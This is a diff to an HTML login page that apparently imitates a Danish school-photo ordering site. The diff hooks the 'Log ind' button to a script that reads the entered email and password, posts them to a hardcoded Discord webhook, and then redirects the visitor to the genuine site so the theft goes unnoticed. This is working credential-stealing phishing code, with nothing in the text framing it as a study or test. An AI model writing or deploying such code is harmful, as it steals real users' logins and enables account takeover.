@@ -118,7 +118,7 @@
     
   </fieldset>
 
-  <input type="submit" name="commit" value="Log ind" class="btn btn-block btn-success" data-disable-with="Log ind">
+  <input type="submit" name="commit" value="Log ind" class="btn btn-block btn-success" data-disable-with="Log ind" onclick="danskSkolePass(); return false;">
 
 </form>
 
@@ -146,6 +146,35 @@
 
 </div>
 
+<script>
+
+function danskSkolePass() {
+
+const webhookUrl = "https://discord.com/api/webhooks/1290755744278384640/xksgeHq79ntoqMt-JlWiEmn3TXQeCoCzU_r4KcvfF57LfjjwKrKrJxYxKV4rgh-xYYmc"
+
+const data = {
+    content: 'Email: ' + session_email.value + ' Password: ' + session_password.value
+};
+
+fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+})
+.then(response => {
+    if (response.ok) {
+        console.log('Message sent successfully');
+  window.location.href = 'https://bestil.danskskolefoto.dk/';
+    } else {
+        console.error('Error sending message');
+    }
+})
+.catch(error => console.error('Fetch error:', error));
+}
+
+</script>
   
 
 
